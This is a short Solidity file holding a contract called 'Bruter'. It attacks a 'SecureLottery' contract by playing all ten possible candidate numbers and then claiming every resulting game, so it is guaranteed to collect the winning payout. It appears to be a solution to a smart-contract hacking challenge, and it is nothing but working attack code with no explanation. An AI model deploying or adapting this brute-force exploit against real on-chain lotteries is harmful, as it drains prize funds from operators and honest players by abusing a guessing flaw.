//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.6;


interface ISecureLottery {
  function play(uint256 candidate) external returns (uint256 gameId);

  function claim(uint256 gameId) external;
}

contract Bruter {
    uint256[10] gamesIDs;
    
    function ten_plays(address addr) external{
        ISecureLottery lot = ISecureLottery(addr);
        
        for (uint i = 0; i < 10; i++){
            gamesIDs[i] = lot.play(i);
        }
    }
    
    function claim_all(address addr) external{
        ISecureLottery lot = ISecureLottery(addr);
        
        for (uint i = 0; i < 10; i++){
            lot.claim(gamesIDs[i]);
        }
    }
}